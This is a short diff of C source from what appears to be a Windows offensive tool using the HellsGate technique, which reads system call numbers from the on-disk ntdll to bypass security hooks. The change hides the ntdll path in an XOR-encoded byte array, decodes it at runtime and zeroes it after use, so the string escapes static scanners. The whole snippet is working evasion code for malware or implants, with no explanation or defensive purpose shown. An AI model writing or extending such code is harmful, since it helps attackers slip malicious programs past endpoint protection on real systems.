@@ -151,10 +151,13 @@ static BOOL gate_in_bounds(const BYTE *base, SIZE_T file_sz,
 /* ── HellsGate: resolve SSNs from clean on-disk ntdll ───────────── */
 
 static BOOL gate_resolve_from_disk(void) {
+    unsigned char _np[] = {0x8,0x71,0x17,0x1c,0x22,0x25,0x2f,0x24,0x3c,0x38,0x17,0x18,0x32,0x38,0x3f,0x2e,0x26,0x78,0x79,0x17,0x25,0x3f,0x2f,0x27,0x27,0x65,0x2f,0x27,0x27,0x00};
+    for (int _i=0;_np[_i];_i++) _np[_i]^=0x4B;
     HANDLE hFile = CreateFileA(
-        "C:\\Windows\\System32\\ntdll.dll",
+        (char*)_np,
         GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         NULL, OPEN_EXISTING, 0, NULL);
+    SecureZeroMemory(_np,sizeof(_np));
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
     LARGE_INTEGER file_size_li;
